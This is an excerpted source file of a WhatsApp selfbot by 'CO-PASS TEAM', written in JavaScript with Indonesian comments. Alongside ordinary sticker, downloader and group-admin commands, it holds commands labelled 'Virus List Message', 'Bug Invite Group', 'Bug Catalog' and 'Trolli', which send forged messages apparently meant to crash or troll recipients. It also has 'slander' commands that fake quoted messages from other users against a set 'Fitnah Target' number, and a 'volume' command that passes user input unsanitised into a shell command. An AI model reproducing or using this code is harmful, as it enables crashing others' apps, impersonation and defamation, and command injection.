...
/*===|===|COPASS TEAM|===|===|
|=====|=====|SETTING|=====|=====*/
banChats = true // Self and Public ( CO-PASS TEAM & Hexagon )
bugc = true // Antibug Gc ( CO-PASS TEAM & MhankBarBar )
antitrol = true // Antifake Trolli ( CO-PASS TEAM & Ivanzz )
offline = false // Offline and Online ( Hexagon )
multi = true // Multi Prefix ( CO-PASS TEAM )
antitags = true // Antitag ( CO-PASS TEAM )
readG = true // Auto Read Group ( CO-PASS TEAM )
readP = false // Auto Read Private ( CO-PASS TEAM )
winawal = 1 // Win Tictactoe ( CO-PASS TEAM )
loseawal = 1 // Lose Tictactoe ( CO-PASS TEAM )
memberwin = 1 // Win ( CO-PASS TEAM )
memberlose = 1 // Lose ( CO-PASS TEAM )
pref = '?' // Prefix ( CO-PASS TEAM )
targetpc = '62882248593508' // Fitnah Target ( Hexagon )
owner = '0' // Numbers Owner ( CO-PASS TEAM )
ownerNumbers = '0@s.whatsapp.net'
fake = 'CO-PASS TEAM' // Fake Text Reply / Name Bot ( CO-PASS TEAM )
a = '```' // Font Whatsapp ( CO-PASS TEAM )
bailver = '3.5.2' // Versi Baileys ( CO-PASS TEAM )
botver = '1.0.0' // Versi Bot ( CO-PASS TEAM )
...
const tunjuk = "👈" // Tictactoe ( CO-PASS TEAM & Lolhuman )
/*================|=========[ title ]===========|=============*/
...
//=================================================//
module.exports = copass = async (copass, mek) => {
	try {
...
longkapnye = "\n".repeat(420)
tekuss = `UDAH GEDE MASIH MAIN BUG GC${longkapnye}\`\`\`BUGGC TERDETEKSI\`\`\`\n@⁨${nums.split('@')[0]} akan dikick\n\n_Clear chat by mans_\n*Jangan maen bug tod*`
copass.groupRemove(mek.key.remoteJid, [nums]).catch((e) => { reply(`*ERR:* ${e}`) })
copass.sendMessage(mek.key.remoteJid, 'WAH BUG NIH', MessageType.text)
copass.sendMessage(mek.key.remoteJid, tekuss, MessageType.text, {contextInfo:{mentionedJid:[nums + "@s.whatsapp.net"]}})
}
                global.blocked
                m = simple.smsg(copass, mek)
		...
		const botNumber = copass.user.jid
		const botNumberss = copass.user.jid + '@c.us'
		...
		const { wa_version, mcc, mnc, os_version, device_manufacturer, device_model } = copass.user.phone
		const totalchat = await copass.chats.all()
		const totalgroup = await copass.chats.array.filter(v => v.jid.endsWith('g.us'))
        const totalkontak = await copass.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
		...
		const groupMetadata = isGroup ? await copass.groupMetadata(from) : ''
        ...
        const conts = mek.key.fromMe ? copass.user.jid : copass.contacts[sender] || { notify: jid.replace(/@.+/, '') }
        const pushname = mek.key.fromMe ? copass.user.name : conts.notify || conts.vname || conts.name || '-'
...
const mess = {
   ...
   "only": {
       ...
       "pribadi": "```⊷️「 Private Only 」```"
        ...
        const reply = (teks) => {
            copass.sendMessage(from, teks, text, {quoted:mek})
        }
        
        const freply = (teks) => {
            copass.sendMessage(from, teks, text, {quoted:mek, contextInfo:{"externalAdReply":{"title": fake,"body": `CO-PASS TEAM`,"previewType": "PHOTO","thumbnailUrl": `https://api.zeks.me/logo.jpg`,"thumbnail": Mthumb,"sourceUrl": `https://api.zeks.me/`}}})
        }

        const sendMess = (hehe, teks) => {
            copass.sendMessage(hehe, teks, text)
        }

        const mentions = (teks, memberr, id) => {
            (id == null || id == undefined || id == false) ? copass.sendMessage(from, teks.trim(), extendedText, { contextInfo: { "mentionedJid": memberr } }) : copass.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": memberr } })
        }

        const fakestatus = (teks) => {
            copass.sendMessage(from, teks, text, {
                quoted: {
                    key: {
                        fromMe: false,
        ...
        const fakethumb = (teks, yes) => {
            copass.sendMessage(from, teks, image, {thumbnail:Mfake,quoted:mek,caption:yes})
        }
        ...
        const sendStickerFromUrl = async(to, url) => {
                ...
                download(url, './database/sampah' + names + '.png', async function () {
                    ...
                    exec(`ffmpeg -i ${filess} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${asw}`, (err) => {
                        ...
                        copass.sendMessage(to, media, MessageType.sticker,{quoted:mek})
...
"body": `CO-PASS TEAM`,
"previewType": "PHOTO",
"thumbnailUrl": `https://api.zeks.me/logo.jpg`,
"thumbnail": Mthumb,
"sourceUrl": `https://api.zeks.me/`
}
// From Baileys Docs
...
copass.sendMessage(id, buttonMessage, MessageType.buttonsMessage, options)
}
// BUTTON MESSAGE TYPE
const sendButImage = async(id, text1, desc1, gam1, but = [], options = {}) => {
kma = gam1
mhan = await copass.prepareMessage(from, kma, image)
...
copass.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
}
// Pahamin dari function sendbutimage terus ini cuman gw bedain type
const sendButVideo = async(id, text1, desc1, vid1, but = [], options = {}) => {
kma = vid1
mhan = await copass.prepareMessage(from, kma, video)
const buttonMessages = {
...
copass.sendMessage(id, buttonMessages, MessageType.buttonsMessage, options)
        ...
        const sendMediaURL = async(to, url, text="", mids=[]) =>{
                ...
                download(url, filename, async function () {
                    ...
                    copass.sendMessage(to, media, type, { quoted: mek, mimetype: mime, caption: text,contextInfo: {"mentionedJid": mids}})
                    
                    fs.unlinkSync(filename)
                });
            }
// ANTI LINK
linknye = `${deflt}` // Anti Link ( CO-PASS TEAM )
...
await copass.modifyChat(m.chat, 'delete', {
...
// AutoReadChat [ Group ]
var chats = await copass.chats.array.filter(v => v.jid.endsWith('g.us'))
chats.map( async ({ jid }) => {
if (readG === false) return
await copass.chatRead(jid)
})
// AutoReadChat [ Private ]
var chatss = await copass.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
...
const checkWin = (sender) => {
            ...
            for (let wn of _win) {
                if (wn.jid === sender) {
                    ...
                    if (winCounts <= 0) return copass.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${winCounts}`
                    found = true
                }
            }
        ...
        const checkLose = (sender) => {
            ...
            for (let ls of _lose) {
                if (ls.jid === sender) {
                    ...
                    if (loseCounts <= 0) return copass.sendMessage(from, `Anda belum pernah memainkan game gelut\n\nJumlah kemenangan kamu didalam game *_Gelut_* adalah: ${winCounts}`, text, { quoted: mek })
                    return `${loseCounts}`
                    found = true
                }
            }
        ...
        return copass.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [orangnye]}}).then(() => {
        ...
        if (tictactoe.hasOwnProperty(senderNumber) && ["1", "2", "3", "4", "5", "6", "7", "8", "9"].includes(budy) && !isCmd) {
            ...
            if (win) {
                ...
                if (win == mode) {
                    ...
                    return copass.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid: [player1 + "@s.whatsapp.net", player2 + "@s.whatsapp.net"]}}).then(() => {
	...
	if (sender == `${tttSkuy.Y}@s.whatsapp.net` && budy.toLowerCase() == 'y') {
		...
		nantang = O
                ...
                return copass.sendMessage(from, tesk, text, {quoted:mek, contextInfo:{mentionedJid: [penantang, lawan]}}).then(() => {
                    var data = {}
...
//========================================================================================================================//
		...
		//Anti Bot Recode By CO-PASS TEAM & CO-PASS TEAM
...
case 'deletepc':
if (!mek.key.fromMe && !isOwner) return
anu = await copass.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
for (let _ of anu) {
copass.modifyChat(_.jid, 'delete', {
includeStarred: false
})
}
await reply(`Berhasil menghapus ${anu.length} private chat`)
break
case 'restart':
if (!mek.key.fromMe && !isOwner) return
...
if (err) return copass.sendMessage(from, `${err}`, text, { quoted: mek })
if (stdout) {
fakestatus('Restart...')
}
})
...
copass.sendMessage(from, teks, text, {contextInfo:{mentionedJid:[mentioned]}})
copass.groupMakeAdmin(from, [mentioned])
} else {
copass.sendMessage(from, `@${mentioned.split('@')[0]} Sekarang Admin!`, text, {contextInfo:{mentionedJid:[mentioned]}})
copass.groupMakeAdmin(from, [mentioned])
}
break
}
...
tagme = '628114811363'
anus = sender
const { menu } = require('./title')
const buttonMessage = {
contentText: menu,
footerText: `CO-PASS TEAM`,
buttons: [
                                     {
...
buf = Mthumb
copass.sendMessage(from, buttonMessage, MessageType.buttonsMessage, options)
break
// AntiDelete
case 'antidelete':
...
filsize = args[0]
costick = await copass.prepareMessageFromContent(from,{
"stickerMessage": {
"url": m.quoted.url,
...
copass.relayWAMessage(costick)
break
// SpamChat [ rentan bot pending ]
case 'spam':
if (!isOwner && !mek.key.fromMe) return
...
addCmd(kodenya, q)
freply("Done Ngab") banyak
} else {
reply('tag stickenya')
}
break
// Del Cmd ( CO-PASS TEAM & Rashid )
case 'delcmd':
...
freply(teksnyee)
break
			// Jadibot [ CO-PASS TEAM ]
			case 'jadibot':
			if (!isOwner) return reply(`_Silahkan Hubungi Owner Untuk Memakai Fitur Ini_`)
			jadibot(copass, from, sender, reply, mek)
			break
// StopJadibot [ CO-PASS TEAM ]
case 'stopbot':
stopjadibot(copass, from, sender, mek)
break
// Antitag On/Off [ CO-PASS TEAM ]
case 'antitag':
if (!mek.key.fromMe && !isOwner) return
...
break
// Virus List Message ( CO-PASS TEAM )
case 'plp':
res = await copass.prepareMessageFromContent(from,{
"listMessage": {
"title": `\`\`\`Hi ${pushname} 👋.\`\`\``,
...
copass.relayWAMessage(res)
break
// VolumeAudio [ CO-PASS TEAM ]
case 'volume':
if (!isQuotedAudio) return reply('Reply audio!')
encmedia = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
media = await copass.downloadAndSaveMediaMessage(encmedia)
rname = getRandom('.mp3')
exec(`ffmpeg -i ${media} -filter:a "volume=${args[0]}" ${rname}`, (err, stderr, stdout) => {
fs.unlinkSync(media)
if (err) return reply('Error!')
jadie = fs.readFileSync(rname)
copass.sendMessage(from, jadie, audio, {mimetype: 'audio/mp4', ptt: true, quoted: mek})
fs.unlinkSync(rname)
})
break
// NgebalikHuruf [ CO-PASS TEAM ]
case 'fliptext':
...
break
// Set Anti Link ( CO-PASS TEAM )
case 'setlink':
if (!mek.key.fromMe && !isOwner) return
		linkcom = ".com" // Anti Link ( CO-PASS TEAM )
		linkid = ".id" // Anti Link ( CO-PASS TEAM )
		linkxyz = ".xyz" // Anti Link ( CO-PASS TEAM )
...
copass.sendMessage(from, `PERINGATAN!!! jika bukan admin jangan send link di group ini`, text)
} else if (args[0] === "0") {
...
break
// Block List ( CO-PASS TEAM & Nurutomo )
case 'blocklist':
let blockede = copass.blocklist.map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').filter(v => v != copass.user.jid)
copass.reply(m.chat, `┌「 *List Blockir* 」` + `\n` + blockede.map((v, i) => `│ ${i + 1}. @${v.split`@`[0]}`).join`\n` + `\n└────`, m, { contextInfo: { mentionedJid: blocked } })
break
// Detik Vn ( CO-PASS TEAM & Denis )
case 'detikvn':
...
copass.sendMessage(from, hah, audio, {mimetype: 'audio/mp4', duration: cokmatane, ptt: true, quoted:mek})
fs.unlinkSync(media)
break
// Detik Video ( CO-PASS TEAM & Denis )
case 'detikvideo':
...
cokmatane = Number(args[0])
hah = fs.readFileSync(media)
copass.sendMessage(from, hah, video, {mimetype: 'video/mp4', duration: cokmatane, quoted: mek})
fs.unlinkSync(media)
break
// Sider ( CO-PASS TEAM )
case 'sider':
...
infom = await copass.messageInfo(from, mek.message.extendedTextMessage.contextInfo.stanzaId)
hemm = infom.reads
...
copass.sendMessage(from, teksx, text, { sendEphemeral: true, quoted: mek, thumbnail: Bfake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readdin }})
copass.sendMessage(from, teksx1, text, { sendEphemeral: true, quoted: mek, thumbnail: Bfake, contextInfo: { forwardingScore:999, isForwarded:true, mentionedJid: readon }})
} catch(e) {
...
copass.sendMessage(from, tapib1, document, { quoted: mek, filename:`CO-PASS TEAM ~ 404 ${vipi}.mp3`, mimetype: 'audio/application' })
await reply('Bang mau nanya')
break
// Get Pic ( CO-PASS TEAM )
case 'getp':
try {
pic = await copass.getProfilePicture(from)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
copass.sendMessage(from, thumb, MessageType.image, {quoted: mek, caption: "Nih kak..."})
break
// Get Pic ( CO-PASS TEAM )
case 'getpic':
if (mek.message.extendedTextMessage != undefined){
...
try {
pic = await copass.getProfilePicture(mentioned)
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
...
try {
pic = await copass.getProfilePicture(args[0])
} catch {
pic = 'https://i.ibb.co/Tq7d7TZ/age-hananta-495-photo.png'
}
thumb = await getBuffer(pic)
...
break
// Get Bio ( CO-PASS TEAM )
case 'getbio':
var yy = mek.message.extendedTextMessage.contextInfo.participant
var p = await copass.getStatus(`${yy}`, MessageType.text)
reply(p.status)
if (p.status == 401) {
reply("Status Profile Not Found")
}
break
// Get Name ( CO-PASS TEAM )
case 'getname':
var ambl = mek.message.extendedTextMessage.contextInfo.participant
const sname = copass.contacts[ambl] != undefined ? copass.contacts[ambl].sname || copass.contacts[ambl].notify : undefined
reply(sname)
break
// Restart Bot ( CO-PASS TEAM )
case 'restart':
if (!mek.key.fromMe && !isOwner) return
reply('Restart...')
...
console.log(stdout)
break
// Play Store ( CO-PASS TEAM & Hexagonz )
case 'playstore':
...
break
// Search Gc ( CO-PASS TEAM & Hexagonz )
case 'searchgc':
...
break
// Status Tictactoe ( CO-PASS TEAM )
case 'cekhistory':
reply(`\`\`\`「 Status Tictactoe 」\`\`\`\n•> Win : ${checkWin(sender)}\n•> Lose : ${checkLose(sender)}`)
break
// Delete Sesi ( CO-PASS TEAM )
case 'delsesi':
...
copass.sendMessage(from, starGame, text, {quoted: mek, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
break
// Twitter Downloader ( CO-PASS TEAM )
case 'twmp4':
...
Anu = res.SD
fto = Mthumb
copass.sendMessage(from, fto, image, {quoted:mek, caption:`*TWITTER MP3*\n\n•> Hd : ${res.HD}\n•> Sd : ${res.SD}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(Anu)
copass.sendMessage(from, khs, audio, {mimetype:'audio/mp4', filename:'copassgan.mp3', quoted:mek, ptt:true})
})
break
// Surah Al-Qur'an ( CO-PASS TEAM & Hexagonz )
case 'surah':
if (!mek.key.fromMe && !isOwner) return
if (args.length < 1) return reply(`Example :\n${prefix}surah 1`)
srh = args[0]
...
break
// Style Text ( CO-PASS TEAM & Nurutomo )
case 'styletext':
...
copass.reply(m.chat, Object.entries(await stylizeText(matext)).map(([name, value]) => `\`\`\`「 ${name} 」\`\`\`\n\n${value}\n\n—————————————————————————`).join`\n\n`, m)
break
// Bug Invite Group ( CO-PASS TEAM )
case 'pgp':
if (!isOwner && !mek.key.fromMe) return
buf = Mfake
imeu = await copass.prepareMessage('0@s.whatsapp.net', buf, image) 
...
"groupName": `CO-PASS TEAM ~ 404 ${vipi}`,
...
copass.relayWAMessage(res)
await setTimeout(() => {
reply('Hacker ( CO-PASS TEAM ~ 404 )')
}, 3000)
break
// Group Invite ( CO-PASS TEAM )
case 'gci':
buf = Mfake
imeu = await copass.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
...
"inviteCode": "wFHwtOxGQN8OwK2x",
"inviteExpiration": "162533333338378",
"groupName": "CO-PASS TEAM",
"jpegThumbnail": "",
"caption": "Subscribe CO-PASS TEAM >_<",
"contextInfo": {
"forwardingScore": 3,
"isForwarded": true
}
...
beks = `@${noes.split("@")[0]}`
copass.sendMessage(from, beks, text, {quoted:mek, contextInfo:{mentionedJid:[noes]}})                
break
// Copy Paste ( CO-PASS TEAM & Nurutomo )
case 'q': 
if (!m.quoted) return reply('reply message!')
let qse = copass.serializeM(await m.getQuotedObj())
if (!qse.quoted) return reply('the message you replied does not contain a reply!')
await qse.quoted.copyNForward(m.chat, true)
break
// Happy Birth Day ( CO-PASS TEAM & Franky )
case 'hbd': 
...
`.trim()
    m.reply(teksh)
break
// Leave Group ( CO-PASS TEAM )
case 'leave':
if (!isOwner && !mek.key.fromMe) return
if (args.length < 1) return reply(`\`\`\`Example :\`\`\`\n\`\`\`${prefix}leave <id>\`\`\``)
ids = args.join(" ")
try {
copass.groupLeave(ids)
reply(`Succes leave group ${ids}`)
} catch(e) {
reply('Error!')
}
break
// List Group ( CO-PASS TEAM & Nurutomo )
case 'listgroup':
case 'listgrup':
case 'listgrop':
case 'gruplist':
case 'groplist':
case 'grouplist':
const txs = copass.chats.all().filter(v => v.jid.endsWith('g.us')).map(v =>`•> ${copass.getName(v.jid)}\n${v.jid}\n[${v.read_only ? 'Left' : 'Joined'}]`).join`\n~~\n`
copass.sendMessage(m.chat, '```「 List Groups 」```\n\n' + txs, text)
break
// Search Text ( CO-PASS TEAM )
case 'searchtext':
...
cok = await copass.searchMessages(`${ve}`, from, batas,1) 
...
copass.sendMessage(from, `Here The Message!`, text, {quoted: cok.messages[i]}) 
}
}
} catch(e) {
console.log(e)
...
copass.groupSettingChange(from, GroupSettingChange.messageSend, false)
} else if (args[0] === 'close') {
reply(`*SUCCES CLOSE GROUP*`)
copass.groupSettingChange(from, GroupSettingChange.messageSend, true)
}
break
// Set Description Group ( CO-PASS TEAM )
case 'setdesc':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
copass.groupUpdateDescription(from, `${args.join(" ")}`)
copass.sendMessage(from, 'Succes change description group', text, {quoted:mek})
break
// Set Name Group ( CO-PASS TEAM )
case 'setname':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
copass.groupUpdateSubject(from, `${args.join(" ")}`)
copass.sendMessage(from, 'Succes change name group', text, {quoted:mek})
break
// Group Info ( CO-PASS TEAM )
case 'groupinfo':
if (!isGroup) return
ppUrl = await copass.getProfilePicture(from) // leave empty to get your own
buffergbl = await getBuffer(ppUrl)
copass.sendMessage(from, buffergbl, image, {quoted: mek, caption: `\`\`\`「 Group Info 」\`\`\`\n*•> Name* : ${groupName}\n*•> Member* : ${groupMembers.length}\n*•> Admin* : ${groupAdmins.length}\n*•> Description* : \n${groupDesc}`})
break
// Demote Admins ( CO-PASS TEAM )
case 'demote':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
...
copass.groupDemoteAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes demote`
copass.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
break
// Promote Members ( CO-PASS TEAM )
case 'promote':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Reply members')
mentionede = mek.message.extendedTextMessage.contextInfo.participant
copass.groupMakeAdmin(from, [mentionede])
teks = `Members @${mentionede.split('@')[0]} succes promote`
copass.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[mentionede]}})
break
// Revoke Link Group ( CO-PASS TEAM )
case 'revoke':
if (!mek.key.fromMe && !isOwner && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin')
if (!isGroup) return
copass.revokeInvite(from)
reply('```Succes revoke link group```')
break
// Bug Catalog ( CO-PASS TEAM )
case 'pcp':
if (!mek.key.fromMe && !isOwner) return
buf = Mfake
imeu = await copass.prepareMessage('0@s.whatsapp.net', buf, image) 
...
"status": "INQUIRY",
"surface": "CATALOG",
"orderTitle": "CO-PASS TEAM ~ Hacker 404",
...
copass.toggleDisappearingMessages(from, 'Awoakwoakwoak')
copass.relayWAMessage(res)
break
// Trolli ( CO-PASS TEAM & Franky )
case 'p': // TROLLI
buf = Mfake
imeu = await copass.prepareMessage('0@s.whatsapp.net', buf, image) 
imeg = imeu.message.imageMessage
...
if (!isGroup) return
if (!isBotGroupAdmins) return reply('Bot not admin')
linkgc = await copass.groupInviteCode(from)
yeh = `\`\`\`「 Link Group 」\`\`\`\n•> Group Whatsapp :\nhttps://chat.whatsapp.com/${linkgc}\n_Nyo bisa nyo ramein_`
copass.sendMessage(from, yeh, text, { quoted: mek })
break
// Kick Members & Admins ( CO-PASS TEAM )
case 'kick':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin!')
if (!isGroup) return
...
copass.groupRemove(from, mems_ids)
} else {
copass.groupRemove(from, [entah[0]])
}
} else {
entah = mek.message.extendedTextMessage.contextInfo.participant
copass.groupRemove(from, [entah])
}
break
// Add Members ( CO-PASS TEAM )
case 'add':
if (!isOwner && !mek.key.fromMe && !isGroupAdmins) return reply('Admin Group Only')
if (!isBotGroupAdmins) return reply('Bot not admin!')
if (!isGroup) return
...
*/
break
// Owner Contact Array ( CO-PASS TEAM )
case 'owner':
case 'admin':
let ini_list = []
for (let i of ownerNumbers) {
const vname = copass.contacts[i] != undefined ? copass.contacts[i].vname || copass.contacts[i].notify : undefined
ini_list.push({
"displayName": 'CO-PASS TEAM',
"vcard": `BEGIN:VCARD\nVERSION:3.0\nN:Sy;Bot;;;\nFN:${vname ? `${vname}` : `${copass.user.name}`}\nitem1.TEL;waid=${i.split('@')[0]}:${i.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`
})
}
hehe = await copass.sendMessage(from, {
"displayName": `${ini_list.length} kontak`,
"contacts": ini_list 
}, 'contactsArrayMessage', { quoted: mek })
copass.sendMessage(from,'Nih Kak Owner Ku ><',text,{quoted: hehe})
break
// Delete Private Message ( CO-PASS TEAM )
case 'deletepc':
if (!mek.key.fromMe && !isOwner) return
anu = await copass.chats.all().filter(v => v.jid.endsWith('s.whatsapp.net'))
for (let _ of anu) {
...
break
// Online ( CO-PASS TEAM & Hexagonz )
case 'on':
if (!mek.key.fromMe && !isOwner) return 
offline = false
freply(' ``ANDA TELAH ONLINE``` ')
break
// Status Bot ( CO-PASS TEAM )
case 'status':
case 'mystat':
case 'botstat':
fkhs = sender
...
copass.sendMessage(from, teks, text, {quoted:mek, contextInfo:{mentionedJid:[fkhs], "externalAdReply":flink}})
break
    case 'off':
            if (!mek.key.fromMe && !isOwner) return 
            offline = true
    ...
    case 'kontag':
            ...
            + 'END:VCARD'.trim()
            copass.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact, {contextInfo: {"mentionedJid": members_ids}})
            break
    case 'sticktag':
            if ((isMedia && !mek.message.videoMessage || isQuotedSticker) && args.length == 0) {
            encmedia = isQuotedSticker ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
            file = await copass.downloadAndSaveMediaMessage(encmedia, filename = getRandom())
            value = args.join(" ")
            var group = await copass.groupMetadata(from)
            ...
            copass.sendMessage(from, ini_buffer, sticker, options)
            fs.unlinkSync(file)
            } else {
    ...
    case 'totag':
            ...
            ini_buffer = fs.readFileSync(file)
            copass.sendMessage(from, ini_buffer, image, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            copass.sendMessage(from, ini_buffer, audio, options)
            fs.unlinkSync(file)
            ...
            ini_buffer = fs.readFileSync(file)
            copass.sendMessage(from, ini_buffer, video, options)
            fs.unlinkSync(file)
        } else{
    ...
    case 'slander':
            ...
            var bot = gh.split("|")[2];
            copass.sendMessage(from, `${bot}`, text, {quoted: { key: { fromMe: false, participant: `${mentioned}`, ...(from ? { remoteJid: from } : {}) }, message: { conversation: `${target}` }}})
            break
    case 'settarget':
    ...
    case 'slanderpm':
            ...
            const responye = await copass.sendMessage(jids, `${split[1]}`, MessageType.text, options)
            await copass.deleteMessage(jids, { id: responye.messageID, remoteJid: jids, fromMe: true })
            break
    case 'tomp3':
            ...
            copass.sendMessage(from, buffer453, audio, { mimetype: 'audio/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'fast':
            ...
            if (err) return fakegroup(`Err: ${err}`)
            buffer453 = fs.readFileSync(ran)
            copass.sendMessage(from, buffer453, video, { mimetype: 'video/mp4', quoted: mek })
            fs.unlinkSync(ran)
            })
            break
    case 'slow':
    ...
    case 'anime':
            ...
            copass.sendMessage(from,media,image,{quoted:mek,caption:'NIH'})
            }
            )
            .catch((error) => {
            console.log(error); 
    ...
    case 'kontak':
            ...
            + `TEL;type=CELL;type=VOICE;waid=${entah}:${phoneNum('+' + entah).getNumber('internasional')}\n`
            + 'END:VCARD'.trim()
            copass.sendMessage(from, {displayName: `${nah}`, vcard: vcard}, contact)
            break    
    case 'take':
    case 'colong':
			...
			require('./lib/fetcher.js').modStick(media, copass, mek, from)
			break
	case 'stikerwm':
	case 'stickerwm':
    case 'swm':
            ...
            .on('error', (e) => {
            console.log(e)
            copass.sendMessage(from, 'Terjadi kesalahan', 'conversation', { quoted: mek })
            fs.unlinkSync(media)
            })
            .on('end', () => {
            _out = getRandom('.webp')
            ...
            .on('exit', () => {
            copass.sendMessage(from, fs.readFileSync(_out),'stickerMessage', { quoted: mek })
            fs.unlinkSync(out)
            fs.unlinkSync(_out)
            fs.unlinkSync(media)
            })
            ...
            const media = await copass.downloadAndSaveMediaMessage(encmedia)
            pe = args.join('')
            var a = pe.split("|")[0];
            var b = pe.split("|")[1];
            await createExif(a,b)
    ...
    case 'upswteks':
            ...
            copass.sendMessage('status@broadcast', `${q}`, extendedText)
    ...
    case 'upswimage':
            ...
            cihcih = await copass.downloadMediaMessage(swsw)
            copass.sendMessage('status@broadcast', cihcih, image, { caption: `${q}` })
            bur = `Sukses Upload Story Image dengan Caption: ${q}`
            copass.sendMessage(from, bur, text, { quoted: mek })
            } else {
    ...
    case 'upswvideo':
            ...
            cihcih = await copass.downloadMediaMessage(swsw)
            copass.sendMessage('status@broadcast', cihcih, video, { caption: `${q}` }) 
    ...
    case 'fdeface':
            ...
            const tipes = await copass.downloadAndSaveMediaMessage(dipes)        
    		...
    		var mat = await copass.generateLinkPreview(url)
    		mat.title = title;
    		mat.description = desc;
    		mat.jpegThumbnail = bufer;
   			mat.canonicalUrl = buu; 
    		copass.sendMessage(from, mat, MessageType.extendedText, anu)
            break
    case 'antibug':
          if (!mek.key.fromMe && !isOwner) return
          if (args[0] === 'on') {
    ...
    case 'tagall':
 	...
 	case 'hidetag':
			...
			copass.sendMessage(from, optionshidetag, text)
			break
	case 'play':
    ...
    case 's':
            ...
            const media = await copass.downloadAndSaveMediaMessage(encmedia)
                ...
                .on('end', function () {
                console.log('Finish')
                copass.sendMessage(from, fs.readFileSync(ran), sticker, {quoted: mek})
                 fs.unlinkSync(media)
                fs.unlinkSync(ran)
                })
                .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=15, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
	...
	case 'ytsearch':
        	...
        	return await copass.sendMessage(from, 'Error!', MessageType.text, dload)
    		}
    		aramat = aramas.all 
	...
	case 'setfakeimg':
			...
			delb = await copass.downloadMediaMessage(boij)
...
copass.sendMessage(from, fak, MessageType.image, {quoted:mek, caption:captionsYtmp4})
copass.sendMessage(from, buff, MessageType.video, {
"contextInfo": {
mimetype: 'video/mp4',
text: 'CO-PASS TEAM',
...
buff = await getBuffer(dl_link)
fak = await getBuffer(thumb)
copass.sendMessage(from, fak, MessageType.image, {quoted:mek, caption:captions})
copass.sendMessage(from, buff, MessageType.audio, {
"contextInfo": {
mimetype: 'audio/mp4',
text: 'CO-PASS TEAM',
"forwardingScore": 1000000000,
...
break
    case 'image':
            ...
            copass.sendMessage(from,{url:images},image,{quoted:mek})
            });
            break
case 'ttmp4':
...
anu = res.nowm
fto = Mthumb
copass.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP4*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, anu, 'Done!')
})
break
case 'ttmp3':
...
anu = res.nowm
fto = Mthumb
copass.sendMessage(from, fto, image, {quoted:mek, caption:`*TIKTOK MP3*\n\n•> Nowm : ${res.nowm}\n•> Wm : ${res.wm}\n•> Audio : ${res.audio}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
khs = await getBuffer(anu)
copass.sendMessage(from, khs, audio, {quoted:mek, mimetype:'audio/mp3', filename:'copassgans.mp3', ptt:true})
})
break
    case 'brainly':
			...
			copass.sendMessage(from, teks, text,{quoted:mek,detectLinks: false})                        
            })              
			break
	    case 'ig':
...
fto = Mthumb
copass.sendMessage(from, fto, image, {quoted:mek, caption:`*INSTAGRAM MP4*\n\n•> Priview : ${res[0].preview}\n•> Link : ${res[0].url}\n•> Linkdl : ${res[0].downloadUrl}\n\n_Please wait, the media file is being sent it may take a few minutes_`, thumbnail:Bfake, contextInfo:{forwardingScore: 989, isForwarded: true}})
sendMediaURL(from, Anu, 'Done!')
})
break
    case 'igstalk':
...
